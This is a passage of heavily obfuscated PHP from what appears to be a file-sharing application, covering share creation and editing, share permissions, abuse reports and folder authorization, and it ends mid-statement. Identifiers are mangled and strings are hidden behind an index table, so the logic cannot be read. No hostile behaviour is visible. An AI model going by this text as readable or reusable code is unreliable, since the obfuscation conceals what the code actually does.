$ÌæçÜÙ­[494] => $ğöû‰Ší, $ÌæçÜÙ­[1678] => $ÌæçÜÙ­[12], $ÌæçÜÙ­[567] => 0, $ÌæçÜÙ­[671] => 0, $ÌæçÜÙ­[1269] => $ÌæçÜÙ­[12], $ÌæçÜÙ­[385] => $ÌæçÜÙ­[12], $ÌæçÜÙ­[975] => $ÌæçÜÙ­[12], $ÌæçÜÙ­[2158] => 0, $ÌæçÜÙ­[2159] => 0, $ÌæçÜÙ­[835] => 0, $ÌæçÜÙ­[2160] => $ÌæçÜÙ­[12], $ÌæçÜÙ­[2141] => $ÌæçÜÙ­[12]); $óú‹åÁ¿ = explode($ÌæçÜÙ­[50], $ÌæçÜÙ­[2161]); foreach ($óú‹åÁ¿ as $Î¹º×–Ó) { if (!isset($¿šÉ¥®Å[$Î¹º×–Ó])) { continue; } $Êí²İ›[$Î¹º×–Ó] = $¿šÉ¥®Å[$Î¹º×–Ó]; } $Óš“ë×â = $this->add($Êí²İ›); $‚ŸûÚ–­ = array($ÌæçÜÙ­[2141] => short_id($Óš“ë×â)); $this->where(array($ÌæçÜÙ­[2162] => $Óš“ë×â))->save($‚ŸûÚ–­); return $Óš“ë×â; } private function _shareAuthSet($Ó™á°‰ , $ıÙŸ«õ‘) { $Ï¸âˆÉ =& $_SERVER[¼¥ÊĞÙÌ]; if (!is_array($ıÙŸ«õ‘)) { return !1; } $åÊÌËŸ = Model($Ï¸âˆÉ[2104]); $åÊÌËŸ->where(array($Ï¸âˆÉ[673] => $Ó™á°‰ ))->delete(); $Òèã™¢ = array(); foreach ($ıÙŸ«õ‘ as $¢è„¿æ) { $ÀšÀõ‰ = SourceModel::TYPE_USER; if ($¢è„¿æ[$Ï¸âˆÉ[191]] == SourceModel::TYPE_GROUP) { $ÀšÀõ‰ = SourceModel::TYPE_GROUP; } $Ü—¼àš = array($Ï¸âˆÉ[673] => $Ó™á°‰ , $Ï¸âˆÉ[191] => $ÀšÀõ‰, $Ï¸âˆÉ[574] => intval($¢è„¿æ[$Ï¸âˆÉ[574]]), $Ï¸âˆÉ[2100] => 0, $Ï¸âˆÉ[2163] => -1); if ($¢è„¿æ[$Ï¸âˆÉ[2100]]) { $Ü—¼àš[$Ï¸âˆÉ[2100]] = $¢è„¿æ[$Ï¸âˆÉ[2100]]; } else { if ($¢è„¿æ[$Ï¸âˆÉ[2163]]) { $Ü—¼àš[$Ï¸âˆÉ[2163]] = $¢è„¿æ[$Ï¸âˆÉ[2163]]; } } $Òèã™¢[] = $Ü—¼àš; } return $åÊÌËŸ->addAll($Òèã™¢, array(), !0); } public function numViewAdd($œïÌÅá®) { $—¡ãì€… =& $_SERVER[¼¥ÊĞÙÌ]; $º–²åÄĞ = array($—¡ãì€…[2162] => $œïÌÅá®); $this->where($º–²åÄĞ)->setAdd($—¡ãì€…[2158]); } public function numDownloadAdd($ú‚œŸ°¥) { $ªıÈ¨À¹ =& $_SERVER[¼¥ÊĞÙÌ]; $¿ı²Áéã = array($ªıÈ¨À¹[2162] => $ú‚œŸ°¥); $this->where($¿ı²Áéã)->setAdd($ªıÈ¨À¹[2159]); } protected function shareEdit($–•É…, $èõµ½Ãƒ) { $®úÓ¦ê— =& $_SERVER[¼¥ÊĞÙÌ]; $Æà¹ÙëÁ = $this->getInfo($–•É…); if (!$Æà¹ÙëÁ) { return !1; } $this->_checkLinkShare($èõµ½Ãƒ, $Æà¹ÙëÁ); $¬ŸİĞ = array(); $úá¦¹ = explode($®úÓ¦ê—[50], $®úÓ¦ê—[2164]); foreach ($úá¦¹ as $Ó˜ö£Ö) { if (!array_key_exists($Ó˜ö£Ö, $èõµ½Ãƒ)) { continue; } $¬ŸİĞ[$Ó˜ö£Ö] = $èõµ½Ãƒ[$Ó˜ö£Ö]; } $this->shareEventAdd($Æà¹ÙëÁ[$®úÓ¦ê—[194]], $èõµ½Ãƒ, $®úÓ¦ê—[1961]); $this->where(array($®úÓ¦ê—[2162] => $–•É…))->save($¬ŸİĞ); if (isset($èõµ½Ãƒ[$®úÓ¦ê—[2150]])) { $this->_shareAuthSet($–•É…, $èõµ½Ãƒ[$®úÓ¦ê—[2150]]); } return !0; } private function _checkLinkShare($ôàïœ†ş, $÷Ù¨­½µ) { $ÌÔÇµ³ =& $_SERVER[¼¥ÊĞÙÌ]; if ($ôàïœ†ş[$ÌÔÇµ³[567]] != $ÌÔÇµ³[91]) { return; } $œÅçìô¹ = $÷Ù¨­½µ[$ÌÔÇµ³[90]][$ÌÔÇµ³[194]]; if ($÷Ù¨­½µ[$ÌÔÇµ³[90]][$ÌÔÇµ³[33]] != $ÌÔÇµ³[233]) { $™Ò³‡•÷ = $this->_folderReport($œÅçìô¹); if (!$™Ò³‡•÷) { return; } show_json(LNG($ÌÔÇµ³[2165]) . $ÌÔÇµ³[2166] . $™Ò³‡•÷, !1); } $¼öÊ¶‚˜ = Model($ÌÔÇµ³[904])->fileInfoGet($÷Ù¨­½µ[$ÌÔÇµ³[90]][$ÌÔÇµ³[194]]); if (!$¼öÊ¶‚˜) { return; } $…˜Í°‰¢ = $this->shareFileMeta($¼öÊ¶‚˜[$ÌÔÇµ³[546]]); if (isset($…˜Í°‰¢[$ÌÔÇµ³[453]]) && $…˜Í°‰¢[$ÌÔÇµ³[453]] == $ÌÔÇµ³[91]) { show_json(LNG($ÌÔÇµ³[2167]), !1); } } private function _folderReport($³‹¬ÍÅ‚) { $ƒÙÀ¦Ÿñ =& $_SERVER[¼¥ÊĞÙÌ]; $Õâ¿¯’ğ = array($ƒÙÀ¦Ÿñ[546] => array($ƒÙÀ¦Ÿñ[1098], 0), $ƒÙÀ¦Ÿñ[824] => 3); $Ñ‚“ÄÎ¤ = Model($ƒÙÀ¦Ÿñ[2168])->where($Õâ¿¯’ğ)->field($ƒÙÀ¦Ÿñ[546])->select(); if (!$Ñ‚“ÄÎ¤) { return !1; } $Ñ‚“ÄÎ¤ = array_to_keyvalue($Ñ‚“ÄÎ¤, $ƒÙÀ¦Ÿñ[12], $ƒÙÀ¦Ÿñ[546]); $­İ‚ïÙª = $ƒÙÀ¦Ÿñ[50] . $³‹¬ÍÅ‚ . $ƒÙÀ¦Ÿñ[50]; $Õâ¿¯’ğ = array($ƒÙÀ¦Ÿñ[546] => array($ƒÙÀ¦Ÿñ[7], $Ñ‚“ÄÎ¤), $ƒÙÀ¦Ÿñ[589] => array($ƒÙÀ¦Ÿñ[462], "\45{$­İ‚ïÙª}\x25"), $ƒÙÀ¦Ÿñ[508] => 0); $çÕº€Òù = Model($ƒÙÀ¦Ÿñ[904])->where($Õâ¿¯’ğ)->field($ƒÙÀ¦Ÿñ[2169])->find(); if (!$çÕº€Òù) { return !1; } $³¤ô…²¥ = substr($çÕº€Òù[$ƒÙÀ¦Ÿñ[589]], strpos($çÕº€Òù[$ƒÙÀ¦Ÿñ[589]], $­İ‚ïÙª)); $Õâ¿¯’ğ = array($ƒÙÀ¦Ÿñ[194] => array($ƒÙÀ¦Ÿñ[7], trim($³¤ô…²¥, $ƒÙÀ¦Ÿñ[50]))); $æÁ¨ˆ´­ = Model($ƒÙÀ¦Ÿñ[904])->where($Õâ¿¯’ğ)->field($ƒÙÀ¦Ÿñ[32])->select(); $ïõÌ€É = array_to_keyvalue($æÁ¨ˆ´­, $ƒÙÀ¦Ÿñ[12], $ƒÙÀ¦Ÿñ[32]); $ïõÌ€É[] = $çÕº€Òù[$ƒÙÀ¦Ÿñ[32]]; return implode($ƒÙÀ¦Ÿñ[8], $ïõÌ€É); } protected function remove($ÃÏ·À§Î) { $Ù÷ĞĞ»Ê =& $_SERVER[¼¥ÊĞÙÌ]; $÷ÖáÔ™ˆ = is_array($ÃÏ·À§Î) ? $ÃÏ·À§Î : array($ÃÏ·À§Î); for ($’Ê®û‰ = 0; $’Ê®û‰ < count($÷ÖáÔ™ˆ); $’Ê®û‰++) { $ñà‡ö» = $this->getInfo($÷ÖáÔ™ˆ[$’Ê®û‰]); if ($ñà‡ö»[$Ù÷ĞĞ»Ê[671]] == $Ù÷ĞĞ»Ê[91]) { Model($Ù÷ĞĞ»Ê[641])->eventShare($ñà‡ö»[$Ù÷ĞĞ»Ê[194]], $Ù÷ĞĞ»Ê[2156]); } if ($ñà‡ö»[$Ù÷ĞĞ»Ê[567]] == $Ù÷ĞĞ»Ê[91]) { Model($Ù÷ĞĞ»Ê[641])->eventShare($ñà‡ö»[$Ù÷ĞĞ»Ê[194]], $Ù÷ĞĞ»Ê[2155]); } $this->shareInfoMofify($ñà‡ö», $Ù÷ĞĞ»Ê[2140]); } $ıÅ›ÆÄº = array($Ù÷ĞĞ»Ê[673] => array($Ù÷ĞĞ»Ê[7], $÷ÖáÔ™ˆ)); $½Ø­Ã©ƒ = $this->where($ıÅ›ÆÄº)->delete(); if ($½Ø­Ã©ƒ) { Model($Ù÷ĞĞ»Ê[674])->where($ıÅ›ÆÄº)->delete(); } return $½Ø­Ã©ƒ; } protected function removeBySource($¯ĞÕ¤’¥) { $Ò”¸Îò =& $_SERVER[¼¥ÊĞÙÌ]; $•óë¹ = array($Ò”¸Îò[494] => array($Ò”¸Îò[495], $¯ĞÕ¤’¥)); $’ê¯˜Öñ = $this->field($Ò”¸Îò[673])->where($•óë¹)->select(); $·ˆËœğ = array_to_keyvalue($’ê¯˜Öñ, $Ò”¸Îò[12], $Ò”¸Îò[673]); if (!$·ˆËœğ) { return; } foreach ($’ê¯˜Öñ as $£œ´Ü Ô) { $this->shareInfoMofify($£œ´Ü Ô, $Ò”¸Îò[2140]); } $•óë¹ = array($Ò”¸Îò[2162] => array($Ò”¸Îò[495], $·ˆËœğ)); $this->where($•óë¹)->delete(); Model($Ò”¸Îò[674])->where($•óë¹)->delete(); } public function listAll($‹ºöîÊ) { $ûÉïèŒ¿ =& $_SERVER[¼¥ÊĞÙÌ]; $§ÕĞúÌÓ = array(); if ($‹ºöîÊ[$ûÉïèŒ¿[1790]]) { $§ÕĞúÌÓ[$ûÉïèŒ¿[1790]] = $‹ºöîÊ[$ûÉïèŒ¿[1790]]; } if ($‹ºöîÊ[$ûÉïèŒ¿[834]]) { $Àƒ•ò†ã = $‹ºöîÊ[$ûÉïèŒ¿[835]] ? $‹ºöîÊ[$ûÉïèŒ¿[835]] : strtotime(date($ûÉïèŒ¿[2170])); $§ÕĞúÌÓ[$ûÉïèŒ¿[234]] = array($ûÉïèŒ¿[411], array($‹ºöîÊ[$ûÉïèŒ¿[834]], $Àƒ•ò†ã)); } if ($‹ºöîÊ[$ûÉïèŒ¿[33]]) { $§ÕĞúÌÓ[$‹ºöîÊ[$ûÉïèŒ¿[33]]] = 1; } else { $§ÕĞúÌÓ[] = array($ûÉïèŒ¿[567] => array($ûÉïèŒ¿[1098], 0), $ûÉïèŒ¿[671] => array($ûÉïèŒ¿[1098], 0), $ûÉïèŒ¿[2144] => $ûÉïèŒ¿[2094]); } if ($‹ºöîÊ[$ûÉïèŒ¿[2090]]) { $§ÕĞúÌÓ[] = array($ûÉïèŒ¿[2141] => $‹ºöîÊ[$ûÉïèŒ¿[2090]], $ûÉïèŒ¿[1678] => array($ûÉïèŒ¿[462], "\45{$‹ºöîÊ[$ûÉïèŒ¿[2090]]}\45"), $ûÉïèŒ¿[2144] => $ûÉïèŒ¿[2094]); } $¬¶Ä°İµ = $this->_makeOrder()->where($§ÕĞúÌÓ)->selectPage(20); if (empty($¬¶Ä°İµ[$ûÉïèŒ¿[448]])) { return array(); } $this->_listDataApply($¬¶Ä°İµ[$ûÉïèŒ¿[448]]); return $¬¶Ä°İµ; } public function listDataApply($¦ûµÄ—ã) { $this->_listDataApply($¦ûµÄ—ã); return $¦ûµÄ—ã; } private function _listDataApply(&$ÄÒñ°¤Û) { $úÀó†• =& $_SERVER[¼¥ÊĞÙÌ]; $ûğäåÖ¬ = array_to_keyvalue($ÄÒñ°¤Û, $úÀó†•[12], $úÀó†•[1790]); $ã¯‚åÖÕ = Model($úÀó†•[602])->userListInfo(array_unique($ûğäåÖ¬)); $˜¹¼ßîĞ = array_to_keyvalue($ÄÒñ°¤Û, $úÀó†•[12], $úÀó†•[194]); $…öÇ«Áê = Model($úÀó†•[904])->sourceListInfo($˜¹¼ßîĞ, !0); foreach ($ÄÒñ°¤Û as $şÕºÚ¥‹ => &$’Àí¾ßÇ) { $íÊÎÚ˜± = $’Àí¾ßÇ[$úÀó†•[1790]]; $’Àí¾ßÇ[$úÀó†•[2171]] = $ã¯‚åÖÕ[$íÊÎÚ˜±] ? $ã¯‚åÖÕ[$íÊÎÚ˜±] : !1; if (!$’Àí¾ßÇ[$úÀó†•[2171]] || $’Àí¾ßÇ[$úÀó†•[2171]][$úÀó†•[824]] != $úÀó†•[91]) { unset($ÄÒñ°¤Û[$şÕºÚ¥‹]); continue; } $È‰ÕëÕ– = $’Àí¾ßÇ[$úÀó†•[194]]; $’Àí¾ßÇ[$úÀó†•[90]] = $…öÇ«Áê[$È‰ÕëÕ–] ? $…öÇ«Áê[$È‰ÕëÕ–] : !1; if ($’Àí¾ßÇ[$úÀó†•[90]][$úÀó†•[508]] == $úÀó†•[91]) { unset($ÄÒñ°¤Û[$şÕºÚ¥‹]); } if ($’Àí¾ßÇ[$úÀó†•[90]] != $úÀó†•[231] && !$’Àí¾ßÇ[$úÀó†•[90]]) { unset($ÄÒñ°¤Û[$şÕºÚ¥‹]); } } unset($’Àí¾ßÇ); $ÄÒñ°¤Û = array_values($ÄÒñ°¤Û); } private function _makeOrder($ÂÕíÏŸ = '') { $’‹±÷şâ =& $_SERVER[¼¥ÊĞÙÌ]; $ÈÒúÈÓ = array($’‹±÷şâ[234], $’‹±÷şâ[835], $’‹±÷şâ[2158], $’‹±÷şâ[2159]); $âß¹­ÉÏ = array($’‹±÷şâ[526] => $’‹±÷şâ[527], $’‹±÷şâ[528] => $’‹±÷şâ[529]); $ç İÜŒ± = Input::get($’‹±÷şâ[533], $’‹±÷şâ[7], $’‹±÷şâ[500], $ÈÒúÈÓ); $ğ¨£âÊ = Input::get($’‹±÷şâ[534], $’‹±÷şâ[7], $’‹±÷şâ[2172], array($’‹±÷şâ[2087], $’‹±÷şâ[528])); $ğ¨£âÊ = $âß¹­ÉÏ[$ğ¨£âÊ]; $ÂÕíÏŸ = $ÂÕíÏŸ . "{$ç İÜŒ±}\40{$ğ¨£âÊ}"; return $this->order($ÂÕíÏŸ); } public function reportAdd($´Ôá—±í) { $ÈÕ¢’­ =& $_SERVER[¼¥ÊĞÙÌ]; $Ü†Ï£Úˆ = array($ÈÕ¢’­[673] => $´Ôá—±í[$ÈÕ¢’­[673]], $ÈÕ¢’­[1790] => USER_ID); if (Model($ÈÕ¢’­[2168])->where($Ü†Ï£Úˆ)->find()) { return !1; } $áŞĞçŠ¢ = array($ÈÕ¢’­[673] => $´Ôá—±í[$ÈÕ¢’­[673]], $ÈÕ¢’­[1678] => $´Ôá—±í[$ÈÕ¢’­[1678]], $ÈÕ¢’­[194] => $´Ôá—±í[$ÈÕ¢’­[194]], $ÈÕ¢’­[546] => $´Ôá—±í[$ÈÕ¢’­[546]], $ÈÕ¢’­[1790] => USER_ID, $ÈÕ¢’­[33] => $´Ôá—±í[$ÈÕ¢’­[33]], $ÈÕ¢’­[529] => $´Ôá—±í[$ÈÕ¢’­[529]]); return Model($ÈÕ¢’­[2168])->add($áŞĞçŠ¢); } public function reportList($¹ËúÎÒĞ) { $Â—öû‡ =& $_SERVER[¼¥ÊĞÙÌ]; $Ëóñ† = array(); if ($¹ËúÎÒĞ[$Â—öû‡[834]]) { $ŠŒü÷Œ = $¹ËúÎÒĞ[$Â—öû‡[835]] ? $¹ËúÎÒĞ[$Â—öû‡[835]] : strtotime(date($Â—öû‡[2170])); $Ëóñ†[$Â—öû‡[234]] = array($Â—öû‡[411], array($¹ËúÎÒĞ[$Â—öû‡[834]], $ŠŒü÷Œ)); } if (isset($¹ËúÎÒĞ[$Â—öû‡[33]]) && in_array($¹ËúÎÒĞ[$Â—öû‡[33]], array($Â—öû‡[91], $Â—öû‡[513], $Â—öû‡[2173], $Â—öû‡[2174], $Â—öû‡[2175]))) { $Ëóñ†[$Â—öû‡[33]] = $¹ËúÎÒĞ[$Â—öû‡[33]]; } if (isset($¹ËúÎÒĞ[$Â—öû‡[824]]) && in_array($¹ËúÎÒĞ[$Â—öû‡[824]], array($Â—öû‡[231], $Â—öû‡[91], $Â—öû‡[513], $Â—öû‡[2173]))) { $Ëóñ†[$Â—öû‡[824]] = $¹ËúÎÒĞ[$Â—öû‡[824]]; } $ïÊçŞ¤ = Input::get($Â—öû‡[534], $Â—öû‡[7], $Â—öû‡[2172], array($Â—öû‡[2087], $Â—öû‡[528])); $…ëï¸ãç = array($Â—öû‡[526] => $Â—öû‡[527], $Â—öû‡[528] => $Â—öû‡[529]); $Â¢•Éòæ = $Â—öû‡[2176] . $…ëï¸ãç[$ïÊçŞ¤]; $¨ÏğÄëÓ = Model($Â—öû‡[2168])->where($Ëóñ†)->order($Â¢•Éòæ)->selectPage(20); if (empty($¨ÏğÄëÓ[$Â—öû‡[448]])) { return array(); } $¢îªßµ¿ = array_to_keyvalue_group($¨ÏğÄëÓ[$Â—öû‡[448]], $Â—öû‡[824], $Â—öû‡[673]); if (!empty($¢îªßµ¿[0])) { $¹ËúÎÒĞ = $¢îªßµ¿[0]; $Ëóñ† = array($Â—öû‡[673] => array($Â—öû‡[7], $¹ËúÎÒĞ)); $Êš‹ºı = $this->where($Ëóñ†)->field($Â—öû‡[673])->select(); $Êš‹ºı = array_to_keyvalue($Êš‹ºı, $Â—öû‡[12], $Â—öû‡[673]); $ÇÖ“ïÂÉ = array_diff($¹ËúÎÒĞ, $Êš‹ºı); if (!empty($ÇÖ“ïÂÉ)) { foreach ($¨ÏğÄëÓ[$Â—öû‡[448]] as $ªÀíˆ => $¹ éÀƒ) { if (in_array($¹ éÀƒ[$Â—öû‡[673]], $ÇÖ“ïÂÉ)) { unset($¨ÏğÄëÓ[$Â—öû‡[448]][$ªÀíˆ]); } } } } $this->_listDataApply($¨ÏğÄëÓ[$Â—öû‡[448]]); return $¨ÏğÄëÓ; } public function reportStatus($…÷›¤¾) { $„­Ì¹Èˆ =& $_SERVER[¼¥ÊĞÙÌ]; $ÇÖèá† = array($„­Ì¹Èˆ[478] => $…÷›¤¾[$„­Ì¹Èˆ[478]]); $ß”®ÇÁ = Model($„­Ì¹Èˆ[2168])->where($ÇÖèá†)->field($„­Ì¹Èˆ[2177])->find(); if (!$ß”®ÇÁ) { return !1; } $ùä¶ÉÓº = array($„­Ì¹Èˆ[824] => $…÷›¤¾[$„­Ì¹Èˆ[824]]); if ($…÷›¤¾[$„­Ì¹Èˆ[824]] == $„­Ì¹Èˆ[2173] && $ß”®ÇÁ[$„­Ì¹Èˆ[824]] == $„­Ì¹Èˆ[2173]) { $ùä¶ÉÓº[$„­Ì¹Èˆ[824]] = 0; } $×¡Œ°ùÎ = Model($„­Ì¹Èˆ[2168])->where($ÇÖèá†)->save($ùä¶ÉÓº); if ($…÷›¤¾[$„­Ì¹Èˆ[824]] == $„­Ì¹Èˆ[513]) { if ($ß”®ÇÁ[$„­Ì¹Èˆ[546]] != $„­Ì¹Èˆ[231] && $this->shareFileMeta($ß”®ÇÁ[$„­Ì¹Èˆ[546]])) { $this->shareFileMeta($ß”®ÇÁ[$„­Ì¹Èˆ[546]], 0); } $this->remove($ß”®ÇÁ[$„­Ì¹Èˆ[673]]); return !0; } if ($×¡Œ°ùÎ && $…÷›¤¾[$„­Ì¹Èˆ[824]] == $„­Ì¹Èˆ[2173]) { $ÕíÛÉ£Ø = $ùä¶ÉÓº[$„­Ì¹Èˆ[824]] == $„­Ì¹Èˆ[2173] ? 1 : 0; $this->shareFileMeta($ß”®ÇÁ[$„­Ì¹Èˆ[546]], $ÕíÛÉ£Ø); $this->removeByFile($ß”®ÇÁ[$„­Ì¹Èˆ[546]]); } return $×¡Œ°ùÎ; } private function removeByFile($·´“óµÖ) { $‰³¥éË =& $_SERVER[¼¥ÊĞÙÌ]; $Ìç„­‚Ö = Model($‰³¥éË[904])->where(array($‰³¥éË[546] => $·´“óµÖ))->field($‰³¥éË[194])->select(); $®’·´­å = array_to_keyvalue($Ìç„­‚Ö, $‰³¥éË[12], $‰³¥éË[194]); $‹ö„à„á = array($‰³¥éË[194] => array($‰³¥éË[7], $®’·´­å), $‰³¥éË[567] => 1); $Ìç„­‚Ö = $this->where($‹ö„à„á)->field($‰³¥éË[673])->select(); if (empty($Ìç„­‚Ö)) { return; } $©ŸÀë¾§ = array_to_keyvalue($Ìç„­‚Ö, $‰³¥éË[12], $‰³¥éË[673]); $this->remove($©ŸÀë¾§); } private function shareFileMeta($î°­šâ¬, $ƒüšˆ‰ = null) { $àû¤…‹ =& $_SERVER[¼¥ÊĞÙÌ]; $ßøäÈåĞ = array($àû¤…‹[546] => $î°­šâ¬, $àû¤…‹[97] => $àû¤…‹[2178]); if (is_null($ƒüšˆ‰)) { return Model($àû¤…‹[2179])->where($ßøäÈåĞ)->find(); } $ßøäÈåĞ[$àû¤…‹[453]] = $ƒüšˆ‰; Model($àû¤…‹[2179])->add($ßøäÈåĞ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\x75\162\x63\145\x5f\x61\x75\164\x68"; public function getAuth($–ÛŞ¹Ë) { $ö‡ö‡õ¨ =& $_SERVER[¼¥ÊĞÙÌ]; $…Ï¼Ûüı = $this->sourceAuthSelect($–ÛŞ¹Ë); $ç…½ÎÉ = array(); $®ÌÛ©ÏŒ = array(); $…Ïº®”· = 2 << 25; foreach ($…Ï¼Ûüı as $õµĞâ•ò) { $Ö£úûå‘ = Model($ö‡ö‡õ¨[576])->listData($õµĞâ•ò[$ö‡ö‡õ¨[2100]]); if (!$Ö£úûå‘) { continue; } $ç…½ÎÉ[] = $õµĞâ•ò; $äî´“Ê¦ = 0; if ($õµĞâ•ò[$ö‡ö‡õ¨[191]] == SourceModel::TYPE_GROUP) { $äî´“Ê¦ = $…Ïº®”· * 2; } if ($õµĞâ•ò[$ö‡ö‡õ¨[191]] == SourceModel::TYPE_USER) { $äî´“Ê¦ = $…Ïº®”·; } if ($õµĞâ•ò[$ö‡ö‡õ¨[191]] == SourceModel::TYPE_USER && $õµĞâ•ò[$ö‡ö‡õ¨[574]] == $ö‡ö‡õ¨[231]) { $äî´“Ê¦ = 0; } $®ÌÛ©ÏŒ[] = $Ö£úûå‘[$ö‡ö‡õ¨[490]] + $äî´“Ê¦; } array_multisort($®ÌÛ©ÏŒ, SORT_DESC, $ç…½ÎÉ); return $ç…½ÎÉ; } public function sourceAuthSelect($½ˆğÏ ) { $şøï‚ =& $_SERVER[¼¥ÊĞÙÌ]; static $ı†²È½® = array(); $ËŞÍÌÖ = is_array($½ˆğÏ ) ? !1 : !0; if ($ËŞÍÌÖ) { $½ˆğÏ  = array($½ˆğÏ ); } $ÒÅïß¦² = array(); foreach ($½ˆğÏ  as $•Á¨×¯‘) { if (isset($ı†²È½®[$•Á¨×¯‘])) { $ÒÅïß¦²[$•Á¨×¯‘] = $ı†²È½®[$•Á¨×¯‘]; } } if (count($ÒÅïß¦²) == count($½ˆğÏ )) { return $ËŞÍÌÖ ? $ÒÅïß¦²[$½ˆğÏ [0]] : $ÒÅïß¦²; } $ˆüØ™ï = $şøï‚[2180]; $„† à´­ = array($şøï‚[194] => array($şøï‚[7], $½ˆğÏ )); $§ÅâÚÇˆ = $this->field($ˆüØ™ï)->order($şøï‚[478])->where($„† à´­)->select(); $È¶»÷è = array_to_keyvalue_group($§ÅâÚÇˆ, $şøï‚[194]); foreach ($½ˆğÏ  as $•Á¨×¯‘) { $ı†²È½®[$•Á¨×¯‘] = $È¶»÷è[$•Á¨×¯‘] ? $È¶»÷è[$•Á¨×¯‘] : array(); } if ($ËŞÍÌÖ) { return $§ÅâÚÇˆ; } return $È¶»÷è; } public function setAuth($õöÍâÎ, $æ±Õİ²Ó) { $Ÿ¢œÔºø =& $_SERVER[¼¥ÊĞÙÌ]; $ûù©à¾¬ = Model($Ÿ¢œÔºø[1440])->sourceInfo($õöÍâÎ); if (!$ûù©à¾¬) { return !1; } if ($ûù©à¾¬[$Ÿ¢œÔºø[191]] != SourceModel::TYPE_GROUP) { return !1; } $ğú°Á›š = 1; $İ¬î’à´ = $ûù©à¾¬[$Ÿ¢œÔºø[574]]; if ($İ¬î’à´ != $ğú°Á›š) { $™¥´µ× = array($Ÿ¢œÔºø[1402] => $İ¬î’à´); $è ƒ²‹ = Model($Ÿ¢œÔºø[2086])->field($Ÿ¢œÔºø[1790])->where($™¥´µ×)->select(); $è ƒ²‹ = array_to_keyvalue($è ƒ²‹, $Ÿ¢œÔºø[12], $Ÿ¢œÔºø[1790]); } $Ÿ—Ç«¨« = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $¦´¿½¹ø = array(); foreach ($æ±Õİ²Ó as $Î¢õÂ) { if (!in_array($Î¢õÂ[$Ÿ¢œÔºø[191]], $Ÿ—Ç«¨«)) { show_json(LNG($Ÿ¢œÔºø[2181]), !1); } if ($İ¬î’à´ != $ğú°Á›š) { if ($Î¢õÂ[$Ÿ¢œÔºø[191]] == SourceModel::TYPE_GROUP) { } if ($Î¢õÂ[$Ÿ¢œÔºø[574]] != 0 && !in_array($Î¢õÂ[$Ÿ¢œÔºø[574]], $è ƒ²‹)) { } } if ($Î¢õÂ[$Ÿ¢œÔºø[574]] == 0) { $Î¢õÂ[$Ÿ¢œÔºø[191]] = SourceModel::TYPE_USER; } $¦´¿½¹ø[] = array($Ÿ¢œÔºø[194] => $õöÍâÎ, $Ÿ¢œÔºø[191] => intval($Î¢õÂ[$Ÿ¢œÔºø[191]]), $Ÿ¢œÔºø[574] => intval($Î¢õÂ[$Ÿ¢œÔºø[574]]), $Ÿ¢œÔºø[2100] => intval($Î¢õÂ[$Ÿ¢œÔºø[2100]]) ? intval($Î¢õÂ[$Ÿ¢œÔºø[2100]]) : 0, $Ÿ¢œÔºø[2163] => intval($Î¢õÂ[$Ÿ¢œÔºø[2163]]) ? intval($Î¢õÂ[$Ÿ¢œÔºø[2163]]) : -1); } $this->where(array($Ÿ¢œÔºø[494] => $õöÍâÎ))->delete(); $this->addAll($¦´¿½¹ø); return !0; } public function authClear($˜Ûë´Âö) { $Ë‹ÛÉ¢Õ =& $_SERVER[¼¥ÊĞÙÌ]; $ÈÓ®»È = Model($Ë‹ÛÉ¢Õ[1440])->sourceInfo($˜Ûë´Âö); $†Œ‘¤ıª = array($˜Ûë´Âö); if ($ÈÓ®»È[$Ë‹ÛÉ¢Õ[488]] == $Ë‹ÛÉ¢Õ[91]) { $×£ÏÅ ù = array($Ë‹ÛÉ¢Õ[660] => array($Ë‹ÛÉ¢Õ[620], $ÈÓ®»È[$Ë‹ÛÉ¢Õ[589]] . $˜Ûë´Âö . $Ë‹ÛÉ¢Õ[621])); $†Œ‘¤ıª = Model($Ë‹ÛÉ¢Õ[1440])->field($Ë‹ÛÉ¢Õ[494])->where($×£ÏÅ ù)->getField($Ë‹ÛÉ¢Õ[194], !0); $†Œ‘¤ıª[] = $˜Ûë´Âö; } $this->where(array($Ë‹ÛÉ¢Õ[494] => array($Ë‹ÛÉ¢Õ[495], $†Œ‘¤ıª)))->delete(); return !0; } public function getAllChildren($êş‚’€Ÿ) { $—ñÊ°Ù¹ =& $_SERVER[¼¥ÊĞÙÌ]; $Ø¸Â¸ = Model($—ñÊ°Ù¹[1440])->sourceInfo($êş‚’€Ÿ); if ($Ø¸Â¸[$—ñÊ°Ù¹[488]] != $—ñÊ°Ù¹[91]) { return $this->sourceListAuth(array($êş‚’€Ÿ)); } if ($Ø¸Â¸[$—ñÊ°Ù¹[191]] != SourceModel::TYPE_GROUP) { return array(); } $šŞ—ùò° = 1; $©Áó¸ß“ = array($êş‚’€Ÿ); if ($Ø¸Â¸[$—ñÊ°Ù¹[193]] == $—ñÊ°Ù¹[231] && $Ø¸Â¸[$—ñÊ°Ù¹[574]] != $šŞ—ùò°) { $©Áó¸ß“ = $this->groupChidldAllRootSource($Ø¸Â¸[$—ñÊ°Ù¹[574]]); } $¹ı¼Èı· = $this->field($—ñÊ°Ù¹[194])->group($—ñÊ°Ù¹[194])->select(); $¹ı¼Èı· = array_to_keyvalue($¹ı¼Èı·, $—ñÊ°Ù¹[12], $—ñÊ°Ù¹[194]); if (!$¹ı¼Èı·) { return array(); } $ôúñúÖ’ = $—ñÊ°Ù¹[2182]; $²÷é—ú­ = array($—ñÊ°Ù¹[194] => array($—ñÊ°Ù¹[7], $¹ı¼Èı·), $—ñÊ°Ù¹[508] => $—ñÊ°Ù¹[231]); $İÜôÂú… = Model($—ñÊ°Ù¹[904])->field($ôúñúÖ’)->where($²÷é—ú­)->select(); $è·Ô£‹ø = array($êş‚’€Ÿ); foreach ($İÜôÂú… as $¦Û“ûŞƒ) { foreach ($©Áó¸ß“ as $ïø´Šæª) { $ÈÉıËáÙ = $—ñÊ°Ù¹[50] . $ïø´Šæª . $—ñÊ°Ù¹[50]; $î¥Ø•È¨ = $¦Û“ûŞƒ[$—ñÊ°Ù¹[589]] . $¦Û“ûŞƒ[$—ñÊ°Ù¹[194]] . $—ñÊ°Ù¹[50]; if (strstr($î¥Ø•È¨, $ÈÉıËáÙ)) { $è·Ô£‹ø[] = $¦Û“ûŞƒ[$—ñÊ°Ù¹[194]]; break; } } } return $this->sourceListAuth($è·Ô£‹ø); } private function sourceListAuth($ØÂ¼½¾) { $Ã¬åšª¢ =& $_SERVER[¼¥ÊĞÙÌ]; $„à—ğš” = Model($Ã¬åšª¢[1440])->sourceListInfo($ØÂ¼½¾, !0); $ ¢º¨´Ë = 